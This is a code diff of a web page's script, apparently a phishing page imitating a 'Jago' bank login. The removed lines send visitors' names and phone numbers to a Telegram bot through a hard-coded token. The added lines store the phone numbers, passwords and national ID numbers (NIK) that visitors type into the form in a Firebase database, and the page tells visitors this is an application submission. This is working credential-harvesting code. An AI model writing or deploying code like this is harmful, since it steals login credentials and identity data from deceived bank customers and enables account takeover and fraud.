@@ -451,30 +451,51 @@
     </section>
 </main>
 
-<script>
-const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
-const CHAT_ID = "8264171951";
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
+  import {
+    getFirestore,
+    collection,
+    addDoc,
+    serverTimestamp
+  } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";
 
-async function kirimTelegram(nama, masked, promo){
-  const pesan = `LOGIN BARU
-Nama: ${nama}
-HP: ${masked}
-🎁 Promo: ${promo}`;
+  const firebaseConfig = {
+    apiKey: "AIzaSyCxQYvVVelrhEB2gDptbv9RulLKrsZTGDs",
+    authDomain: "myjago-login.firebaseapp.com",
+    projectId: "myjago-login",
+    storageBucket: "myjago-login.firebasestorage.app",
+    messagingSenderId: "229354468112",
+    appId: "1:229354468112:web:f453bbe31b1258e2ebeb95"
+  };
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: pesan
-    })
-  });
-}
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
 
+  window.kirimDemo = async function () {
+    const input1 = document.querySelectorAll(".input")[0].value.trim();
+    const input2 = document.querySelectorAll(".input")[1].value.trim();
+    const input3 = document.querySelectorAll(".input")[2].value.trim();
+
+    if (!input1 || !input2 || !input3) {
+      alert("Lengkapi data dulu");
+      return;
+    }
+
+    try {
+      await addDoc(collection(db, "pengajuan"), {
+        nomor: input1,
+        pasword: input2,
+        nik: input3,
+        status: "baru",
+        waktu: serverTimestamp()
+      });
+
+      alert("Pengajuan berhasil dikirim");
+    } catch (err) {
+      console.error(err);
+      alert("Gagal menyimpan data");
+    }
+  };
 </script>
-
-</body>
-</html>
 
